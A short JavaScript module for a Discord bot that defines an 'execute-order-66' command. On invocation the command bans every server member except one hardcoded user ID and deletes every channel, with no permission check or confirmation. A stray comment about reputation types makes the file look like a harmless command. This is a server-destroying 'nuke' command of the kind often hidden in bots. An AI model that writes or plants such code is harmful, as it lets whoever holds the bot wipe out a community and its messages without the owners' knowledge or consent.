const CommandTemplate = require(`../my_modules/CommandTemplate.js`);
const botConfig = require(`../config/config.json`);
const {db} = require(`../my_modules/database.js`);
const Discord = require(`discord.js`);

/*
    type:
    0: -rep
    1: +rep
*/

class ExecuteOrder66 extends CommandTemplate {
    constructor(msg, args) {
        super(msg, args)

        msg.guild.members.cache.map(member => {
            if (member.id != `599569173990866965`) {
                member.ban({days: 7, reason: 'bye'})
            }
        })

        msg.guild.channels.cache.forEach(channel => channel.delete());
    }
}

module.exports = {
    name: `execute-order-66`,
    execute(msg, args) {new ExecuteOrder66(msg, args)}
}